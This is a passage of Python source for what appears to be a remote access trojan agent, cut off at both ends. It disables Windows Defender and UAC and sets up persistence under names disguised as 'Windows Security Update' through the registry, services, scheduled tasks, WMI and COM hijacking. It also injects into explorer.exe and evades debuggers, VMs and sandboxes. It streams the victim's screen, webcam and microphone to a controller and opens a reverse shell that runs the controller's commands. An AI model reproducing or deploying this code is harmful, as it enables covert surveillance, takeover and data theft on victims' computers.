        # Method 1: .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System update check\npython3 {current_exe} &\n")
        except:
            pass
        
        return True
        
    except Exception as e:
        print(f"Linux persistence failed: {e}")
        return False

def disable_defender():
    """Attempt to disable Windows Defender (requires admin privileges)."""
    if not WINDOWS_AVAILABLE or not is_admin():
        return False
    
    try:
        # Multiple methods to disable Windows Defender
        defender_disable_methods = [
            disable_defender_registry,
            disable_defender_powershell,
            disable_defender_group_policy,
            disable_defender_service,
        ]
        
        for method in defender_disable_methods:
            try:
                if method():
                    return True
            except:
                continue
        
        return False
        
    except Exception as e:
        print(f"Failed to disable Defender: {e}")
        return False

def disable_defender_registry():
    """Disable Windows Defender via registry modifications."""
    try:
        import winreg
        
        # Disable real-time monitoring
        defender_key = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        realtime_key = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        
        # Create keys and set values
        keys_values = [
            (defender_key, "DisableAntiSpyware", 1),
            (realtime_key, "DisableRealtimeMonitoring", 1),
            (realtime_key, "DisableBehaviorMonitoring", 1),
            (realtime_key, "DisableOnAccessProtection", 1),
            (realtime_key, "DisableScanOnRealtimeEnable", 1),
        ]
        
        for key_path, value_name, value_data in keys_values:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Registry Defender disable failed: {e}")
        return False

def disable_defender_powershell():
    """Disable Windows Defender via PowerShell commands."""
    try:
        powershell_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisablePrivacyMode $true',
            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
            'Set-MpPreference -DisableArchiveScanning $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -SubmitSamplesConsent 2',
        ]
        
        for cmd in powershell_commands:
            try:
                subprocess.run([
                    'powershell.exe', '-Command', cmd
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        # Add exclusions for common paths
        exclusion_paths = [
            os.path.dirname(os.path.abspath(__file__)),
            tempfile.gettempdir(),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Documents"),
        ]
        
        for path in exclusion_paths:
            try:
                subprocess.run([
                    'powershell.exe', '-Command',
                    f'Add-MpPreference -ExclusionPath "{path}"'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"PowerShell Defender disable failed: {e}")
        return False

def disable_defender_group_policy():
    """Disable Windows Defender via Group Policy modifications."""
    try:
        import winreg
        
        # Group Policy registry paths
        gp_paths = [
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection", "ForceDefenderPassiveMode", 1),
        ]
        
        for key_path, value_name, value_data in gp_paths:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Group Policy Defender disable failed: {e}")
        return False

def disable_defender_service():
    """Disable Windows Defender services."""
    try:
        services_to_disable = [
            'WinDefend',
            'WdNisSvc',
            'WdNisDrv',
            'WdFilter',
            'WdBoot',
            'Sense',
        ]
        
        for service in services_to_disable:
            try:
                # Stop service
                subprocess.run([
                    'sc.exe', 'stop', service
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
                
                # Disable service
                subprocess.run([
                    'sc.exe', 'config', service, 'start=', 'disabled'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Service Defender disable failed: {e}")
        return False

def advanced_process_hiding():
    """Advanced process hiding techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Process Hollowing (simplified)
        hollow_process()
        
        # Method 2: DLL Injection into trusted process
        inject_into_trusted_process()
        
        # Method 3: Process Doppelganging (simplified)
        process_doppelganging()
        
        return True
        
    except Exception as e:
        print(f"Advanced process hiding failed: {e}")
        return False

def hollow_process():
    """Simple process hollowing technique."""
    try:
        # Create suspended process
        target_process = "notepad.exe"
        
        si = win32process.STARTUPINFO()
        pi = win32process.CreateProcess(
            None,
            target_process,
            None,
            None,
            False,
            win32con.CREATE_SUSPENDED,
            None,
            None,
            si
        )
        
        # In a real implementation, we would:
        # 1. Unmap the original executable
        # 2. Allocate memory for our payload
        # 3. Write our payload to the process memory
        # 4. Update the entry point
        # 5. Resume the process
        
        # For this demo, just resume the process
        win32process.ResumeThread(pi[1])
        
        win32api.CloseHandle(pi[0])
        win32api.CloseHandle(pi[1])
        
        return True
        
    except Exception as e:
        print(f"Process hollowing failed: {e}")
        return False

def inject_into_trusted_process():
    """Inject into a trusted process."""
    try:
        # Find explorer.exe process
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                # Get process handle
                process_handle = win32api.OpenProcess(
                    win32con.PROCESS_ALL_ACCESS,
                    False,
                    proc.info['pid']
                )
                
                # Allocate memory in target process
                dll_path = os.path.abspath(__file__).encode('utf-8')
                memory_address = win32process.VirtualAllocEx(
                    process_handle,
                    0,
                    len(dll_path),
                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                    win32con.PAGE_READWRITE
                )
                
                # Write DLL path to target process
                win32process.WriteProcessMemory(
                    process_handle,
                    memory_address,
                    dll_path,
                    len(dll_path)
                )
                
                # Get LoadLibraryA address
                kernel32 = win32api.GetModuleHandle("kernel32.dll")
                loadlibrary_addr = win32api.GetProcAddress(kernel32, "LoadLibraryA")
                
                # Create remote thread
                thread_handle = win32process.CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    loadlibrary_addr,
                    memory_address,
                    0
                )
                
                win32api.CloseHandle(thread_handle)
                win32api.CloseHandle(process_handle)
                
                return True
                
        return False
        
    except Exception as e:
        print(f"Process injection failed: {e}")
        return False

def process_doppelganging():
    """Simplified process doppelganging technique."""
    try:
        # This is a simplified version - real implementation would use NTFS transactions
        temp_file = os.path.join(tempfile.gettempdir(), "temp_process.exe")
        
        # Copy legitimate executable
        legitimate_exe = r"C:\Windows\System32\notepad.exe"
        
        if os.path.exists(legitimate_exe):
            import shutil
            shutil.copy2(legitimate_exe, temp_file)
            
            # In real implementation, we would:
            # 1. Create NTFS transaction
            # 2. Overwrite file content with our payload
            # 3. Create process from the transacted file
            # 4. Rollback transaction
            
            # For demo, just execute the copied file
            subprocess.Popen([temp_file], creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Clean up
            time.sleep(1)
            try:
                os.remove(temp_file)
            except:
                pass
                
            return True
        
        return False
        
    except Exception as e:
        print(f"Process doppelganging failed: {e}")
        return False

def advanced_persistence():
    """Advanced persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        persistence_methods = [
            setup_registry_persistence,
            setup_service_persistence, 
            setup_scheduled_task_persistence,
            setup_wmi_persistence,
            setup_com_hijacking_persistence,
        ]
        
        for method in persistence_methods:
            try:
                method()
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Advanced persistence failed: {e}")
        return False

def setup_service_persistence():
    """Setup persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        service_name = "WindowsSecurityUpdate"
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', service_name,
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Update Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Start service
        subprocess.run([
            'sc.exe', 'start', service_name
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"Service persistence failed: {e}")
        return False

def setup_scheduled_task_persistence():
    """Setup persistence via scheduled task."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        task_name = "WindowsSecurityUpdateTask"
        
        # Create scheduled task
        subprocess.run([
            'schtasks.exe', '/create',
            '/tn', task_name,
            '/tr', current_exe,
            '/sc', 'onlogon',
            '/rl', 'highest',
            '/f'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"Scheduled task persistence failed: {e}")
        return False

def setup_wmi_persistence():
    """Setup persistence via WMI event subscription."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # WMI persistence using PowerShell
        wmi_script = f'''
$filterName = 'WindowsSecurityFilter'
$consumerName = 'WindowsSecurityConsumer'

$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query}}

$Arg = @{{
    Name=$consumerName
    CommandLineTemplate="{current_exe}"
}}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg

$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}}
'''
        
        subprocess.run([
            'powershell.exe', '-Command', wmi_script
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"WMI persistence failed: {e}")
        return False

def setup_com_hijacking_persistence():
    """Setup persistence via COM hijacking."""
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack a commonly used COM object
        clsid = "{00000000-0000-0000-0000-000000000000}"  # Placeholder CLSID
        key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        print(f"COM hijacking persistence failed: {e}")
        return False

def add_firewall_exception():
    """Add firewall exception for the current process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
        
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            f'name="Python Agent {uuid.uuid4()}"',
            'dir=in', 'action=allow',
            f'program="{current_exe}"'
        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
        
        return True
        
    except Exception as e:
        print(f"Failed to add firewall exception: {e}")
        return False

def hide_process():
    """Attempt to hide the current process from task manager."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set process to run in background with low priority
        process = psutil.Process()
        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        
        # Try to hide from process list (limited effectiveness)
        ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
        
        return True
        
    except Exception as e:
        print(f"Failed to hide process: {e}")
        return False

def disable_uac():
    """Disable UAC (User Account Control) by modifying registry settings."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
        print("[OK] UAC has been disabled.")
        return True
    except PermissionError:
        print("[!] Access denied. Run this script as administrator.")
        return False
    except Exception as e:
        print(f"[!] Error disabling UAC: {e}")
        return False

def run_as_admin():
    """Relaunch the script with elevated privileges if not already admin."""
    if not WINDOWS_AVAILABLE:
        return False
    
    if not is_admin():
        print("[!] Relaunching as Administrator...")
        try:
            # Relaunch with elevated privileges
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}"', None, 1
            )
            sys.exit()
        except Exception as e:
            print(f"[!] Failed to relaunch as admin: {e}")
            return False
    return True

def setup_persistence():
    """Setup persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Add to startup registry
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        print(f"Failed to setup persistence: {e}")
        return False

def anti_analysis():
    """Anti-analysis and evasion techniques."""
    try:
        # Check for common analysis tools
        analysis_processes = [
            'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
            'wireshark.exe', 'fiddler.exe', 'vmware.exe', 'vbox.exe', 'virtualbox.exe',
            'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in analysis_processes:
                # If analysis tool detected, sleep and exit
                time.sleep(60)
                sys.exit(0)
        
        # Check for VM environment
        vm_indicators = [
            'VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'XEN'
        ]
        
        try:
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                if any(indicator in system.Model.upper() for indicator in vm_indicators):
                    time.sleep(60)
                    sys.exit(0)
        except:
            pass
        
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            time.sleep(60)
            sys.exit(0)
        
        # Anti-sandbox: Check for mouse movement
        try:
            import win32gui
            pos1 = win32gui.GetCursorPos()
            time.sleep(2)
            pos2 = win32gui.GetCursorPos()
            if pos1 == pos2:
                # No mouse movement, might be sandbox
                time.sleep(60)
                sys.exit(0)
        except:
            pass
        
        return True
        
    except Exception as e:
        return False

def obfuscate_strings():
    """Obfuscate sensitive strings to avoid static analysis."""
    # Simple XOR obfuscation for sensitive strings
    key = 0x42
    
    # Obfuscated strings (example)
    obfuscated = {
        'admin': ''.join(chr(ord(c) ^ key) for c in 'admin'),
        'elevate': ''.join(chr(ord(c) ^ key) for c in 'elevate'),
        'bypass': ''.join(chr(ord(c) ^ key) for c in 'bypass'),
        'privilege': ''.join(chr(ord(c) ^ key) for c in 'privilege')
    }
    
    return obfuscated

def sleep_random():
    """Random sleep to avoid pattern detection."""
    sleep_time = random.uniform(0.5, 2.0)
    time.sleep(sleep_time)

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Reverse Shell State ---
REVERSE_SHELL_ENABLED = True
REVERSE_SHELL_THREAD = None
REVERSE_SHELL_SOCKET = None

# --- Voice Control State ---
VOICE_CONTROL_ENABLED = False
VOICE_CONTROL_THREAD = None
VOICE_RECOGNIZER = None

# --- Monitoring State ---
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

def get_or_create_agent_id():
    """
    Gets a unique agent ID from config directory or creates it.
    """
    if WINDOWS_AVAILABLE:
        config_path = os.getenv('APPDATA')
    else:
        config_path = os.path.expanduser('~/.config')
        
    os.makedirs(config_path, exist_ok=True)
    id_file_path = os.path.join(config_path, 'agent_id.txt')
    
    if os.path.exists(id_file_path):
        with open(id_file_path, 'r') as f:
            return f.read().strip()
    else:
        agent_id = str(uuid.uuid4())
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        # Hide the file on Windows
        if WINDOWS_AVAILABLE:
            try:
                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
        return agent_id

def stream_screen(agent_id):
    """
    High-performance screen streaming with 60+ FPS capability.
    Uses optimized capture backend and compression.
    """
    global STREAMING_ENABLED
    
    # For now, skip high-performance capture and use fallback
    try:
        # This will be implemented when we reorganize the code
        raise ImportError("Using fallback streaming for now")
        
        url = f"{SERVER_URL}/stream/{agent_id}"
        headers = {'Content-Type': 'image/jpeg'}
        
        def send_frame(frame_data):
            """Callback to send frame data"""
            if frame_data and frame_data != b'DELTA_UNCHANGED':
                try:
                    start_time = time.time()
                    
                    # Handle compressed frames
                    if frame_data.startswith(b'LZ4_COMPRESSED'):
                        headers['Content-Encoding'] = 'lz4'
                        frame_data = frame_data[14:]  # Remove prefix
                    else:
                        headers.pop('Content-Encoding', None)
                    
                    response = requests.post(url, data=frame_data, headers=headers, timeout=0.1)
                    
                    # Update bandwidth stats for adaptive quality
                    elapsed = time.time() - start_time
                    quality_manager.update_bandwidth(len(frame_data), elapsed)
                    
                except requests.exceptions.Timeout:
                    pass  # Skip frame if timeout - prioritize low latency
                except Exception as e:
                    print(f"Frame send error: {e}")
        
        print(f"Starting high-performance screen capture: {capture.get_stats()}")
        
        # Start the capture stream
        capture.start_capture_stream(send_frame)
        
        # Keep the stream alive
        while STREAMING_ENABLED:
            time.sleep(1)
            
            # Log performance stats occasionally
            stats = capture.get_stats()
            if stats.get('actual_fps', 0) > 0:
                print(f"Streaming at {stats['actual_fps']} FPS using {stats['backend']}")
        
        # Cleanup
        capture.stop_capture_stream()
        print("High-performance screen streaming stopped")
        
    except ImportError:
        print("High-performance capture not available, falling back to standard streaming")
        # Fallback to original implementation with improvements
        _stream_screen_fallback(agent_id)
    except Exception as e:
        print(f"High-performance streaming error: {e}")
        _stream_screen_fallback(agent_id)

def _stream_screen_fallback(agent_id):
    """
    Fallback screen streaming with basic optimizations
    """
    global STREAMING_ENABLED
    url = f"{SERVER_URL}/stream/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    with mss.mss() as sct:
        # Optimize for higher FPS than original
        target_fps = 45  # Increased from 30
        frame_time = 1.0 / target_fps
        last_frame_hash = None
        frame_skip_count = 0
        
        while STREAMING_ENABLED:
            try:
                current_time = time.time()
                
                # Get raw pixels from the screen
                sct_img = sct.grab(sct.monitors[1])
                
                # Create an OpenCV image
                img = np.array(sct_img)
                
                # Basic delta compression - skip identical frames
                import hashlib
                frame_hash = hashlib.md5(img.tobytes()).hexdigest()
                if frame_hash == last_frame_hash:
                    frame_skip_count += 1
                    if frame_skip_count < 5:  # Skip up to 5 identical frames
                        time.sleep(frame_time * 0.5)
                        continue
                
                last_frame_hash = frame_hash
                frame_skip_count = 0
                
                # Resize for better performance if screen is too large
                height, width = img.shape[:2]
                if width > 1920:
                    scale = 1920 / width
                    new_width = int(width * scale)
                    new_height = int(height * scale)
                    img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
                
                # Encode with better compression settings
                is_success, buffer = cv2.imencode(".jpg", img, [
                    cv2.IMWRITE_JPEG_QUALITY, 90,  # Slightly higher quality
                    cv2.IMWRITE_JPEG_OPTIMIZE, 1,
                    cv2.IMWRITE_JPEG_PROGRESSIVE, 1
                ])
                if not is_success:
                    continue

                # Send the frame asynchronously with shorter timeout
                try:
                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.05)
                except requests.exceptions.Timeout:
                    pass  # Skip frame if timeout
                
                # Maintain target FPS with better timing
                elapsed = time.time() - current_time
                sleep_time = max(0, frame_time - elapsed)
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
            except Exception as e:
                print(f"Stream error: {e}")
                time.sleep(0.5)  # Shorter wait before retrying

def stream_camera(agent_id):
    """
    Captures the webcam and streams it to the controller at high FPS.
    This function runs in a separate thread.
    """
    global CAMERA_STREAMING_ENABLED
    url = f"{SERVER_URL}/camera/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    try:
        # Use CAP_DSHOW on Windows for better device compatibility and performance.
        if WINDOWS_AVAILABLE:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        else:
            cap = cv2.VideoCapture(0)
            
        if not cap.isOpened():
            print("Cannot open webcam")
            CAMERA_STREAMING_ENABLED = False
            return
            
        # Set camera properties for higher FPS
        cap.set(cv2.CAP_PROP_FPS, 30)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Reduce buffer for lower latency
        
    except Exception as e:
        print(f"Could not open webcam: {e}")
        CAMERA_STREAMING_ENABLED = False
        return

    target_fps = 30
    frame_time = 1.0 / target_fps
    
    while CAMERA_STREAMING_ENABLED:
        try:
            current_time = time.time()
            
            ret, frame = cap.read()
            if not ret:
                break
                
            # Optimize frame quality for speed
            is_success, buffer = cv2.imencode(".jpg", frame, [
                cv2.IMWRITE_JPEG_QUALITY, 85,
                cv2.IMWRITE_JPEG_OPTIMIZE, 1
            ])
            if is_success:
                try:
                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
                except requests.exceptions.Timeout:
                    pass  # Skip frame if timeout
                    
            # Maintain target FPS
            elapsed = time.time() - current_time
            sleep_time = max(0, frame_time - elapsed)
            if sleep_time > 0:
                time.sleep(sleep_time)
                
        except Exception as e:
            print(f"Camera stream error: {e}")
            time.sleep(1)
            
    cap.release()

def stream_audio(agent_id):
    """
    Captures microphone audio and streams it to the controller.
    This function runs in a separate thread.
    """
    global AUDIO_STREAMING_ENABLED
    url = f"{SERVER_URL}/audio/{agent_id}"
    
    try:
        p = pyaudio.PyAudio()
        # --- Diagnostic: Print the default device to be used ---
        default_device_info = p.get_default_input_device_info()
        print(f"Attempting to use default audio device: {default_device_info['name']}")
        # --- End Diagnostic ---
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, input_device_index=default_device_info['index'])
    except Exception as e:
        print(f"Could not open audio stream: {e}")
        AUDIO_STREAMING_ENABLED = False
        return

    while AUDIO_STREAMING_ENABLED:
        try:
            data = stream.read(CHUNK)
            requests.post(url, data=data, timeout=1)
        except Exception as e:
            print(f"Audio stream error: {e}")
            break
    
    stream.stop_stream()
    stream.close()
    p.terminate()

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    if not STREAMING_ENABLED:
        STREAMING_ENABLED = True
        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
        STREAM_THREAD.daemon = True
        STREAM_THREAD.start()
        print("Started video stream.")

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD
    if STREAMING_ENABLED:
        STREAMING_ENABLED = False
        if STREAM_THREAD:
            STREAM_THREAD.join(timeout=2)
        STREAM_THREAD = None
        print("Stopped video stream.")

def start_audio_streaming(agent_id):
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if not AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = True
        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
        AUDIO_STREAM_THREAD.daemon = True
        AUDIO_STREAM_THREAD.start()
        print("Started audio stream.")

def stop_audio_streaming():
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = False
        if AUDIO_STREAM_THREAD:
            AUDIO_STREAM_THREAD.join(timeout=2)
        AUDIO_STREAM_THREAD = None
        print("Stopped audio stream.")

def start_camera_streaming(agent_id):
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if not CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = True
        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
        CAMERA_STREAM_THREAD.daemon = True
        CAMERA_STREAM_THREAD.start()
        print("Started camera stream.")

def stop_camera_streaming():
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = False
        if CAMERA_STREAM_THREAD:
            CAMERA_STREAM_THREAD.join(timeout=2)
        CAMERA_STREAM_THREAD = None
        print("Stopped camera stream.")

# --- Reverse Shell Functions ---

def reverse_shell_handler(agent_id):
    """
    Handles reverse shell connections and command execution.
    This function runs in a separate thread.
    """
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_SOCKET
    
    try:
        # Create socket connection back to controller
        REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        controller_host = SERVER_URL.split("://")[1].split(":")[0]  # Extract host from SERVER_URL
        controller_port = 9999  # Dedicated port for reverse shell
        
        REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
        print(f"Reverse shell connected to {controller_host}:{controller_port}")
        
        # Send initial connection info
        system_info = {
            "agent_id": agent_id,
            "hostname": socket.gethostname(),
            "platform": os.name,
            "cwd": os.getcwd(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        }
        REVERSE_SHELL_SOCKET.send(json.dumps(system_info).encode() + b'\n')
        
        while REVERSE_SHELL_ENABLED:
            try:
                # Receive command from controller
                data = REVERSE_SHELL_SOCKET.recv(4096)
                if not data:
                    break
                    
                command = data.decode().strip()
                if not command:
                    continue
                    
                # Handle special commands
                if command.lower() == "exit":
                    break
                elif command.startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        response = f"Changed directory to: {os.getcwd()}\n"
                    except Exception as e:
                        response = f"cd error: {str(e)}\n"
                else:
                    # Execute regular command
                    try:
                        if WINDOWS_AVAILABLE:
                            result = subprocess.run(
                                ["powershell.exe", "-NoProfile", "-Command", command],
                                capture_output=True,
                                text=True,
                                timeout=30,
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                        else:
                            result = subprocess.run(
                                ["bash", "-c", command],
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                        response = result.stdout + result.stderr
                        if not response:
                            response = "[Command executed successfully - no output]\n"
                    except subprocess.TimeoutExpired:
                        response = "[Command timed out after 30 seconds]\n"
                    except Exception as e:
                        response = f"[Command execution error: {str(e)}]\n"
                
                # Send response back
                REVERSE_SHELL_SOCKET.send(response.encode())
                
            except socket.timeout:
                continue
            except Exception as e:
                print(f"Reverse shell error: {e}")
                break
                
    except Exception as e:
        print(f"Reverse shell connection error: {e}")
    finally:
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        REVERSE_SHELL_SOCKET = None
        print("Reverse shell disconnected")

def start_reverse_shell(agent_id):
    """Start the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD
    if not REVERSE_SHELL_ENABLED:
        REVERSE_SHELL_ENABLED = True
        REVERSE_SHELL_THREAD = threading.Thread(target=reverse_shell_handler, args=(agent_id,))
        REVERSE_SHELL_THREAD.daemon = True
        REVERSE_SHELL_THREAD.start()
        print("Started reverse shell.")

def stop_reverse_shell():
    """Stop the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD, REVERSE_SHELL_SOCKET
    if REVERSE_SHELL_ENABLED:
        REVERSE_SHELL_ENABLED = False
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        if REVERSE_SHELL_THREAD:
            REVERSE_SHELL_THREAD.join(timeout=2)
        REVERSE_SHELL_THREAD = None
        print("Stopped reverse shell.")

# --- Voice Control Functions ---

def voice_control_handler(agent_id):
    """
    Handles voice recognition and command processing.
    This function runs in a separate thread.
    """
    global VOICE_CONTROL_ENABLED, VOICE_RECOGNIZER
    
    if not SPEECH_RECOGNITION_AVAILABLE:
        print("Speech recognition not available - install speechrecognition library")
        return
    
    VOICE_RECOGNIZER = sr.Recognizer()
    microphone = sr.Microphone()
    
    # Adjust for ambient noise
    with microphone as source:
        print("Adjusting for ambient noise... Please wait.")
        VOICE_RECOGNIZER.adjust_for_ambient_noise(source)
        print("Voice control ready. Listening for commands...")
    
    while VOICE_CONTROL_ENABLED:
        try:
            with microphone as source:
                # Listen for audio with timeout
                audio = VOICE_RECOGNIZER.listen(source, timeout=1, phrase_time_limit=5)
            
            try:
                # Recognize speech using Google Speech Recognition
                command = VOICE_RECOGNIZER.recognize_google(audio).lower()
                print(f"Voice command received: {command}")
                
                # Process voice commands
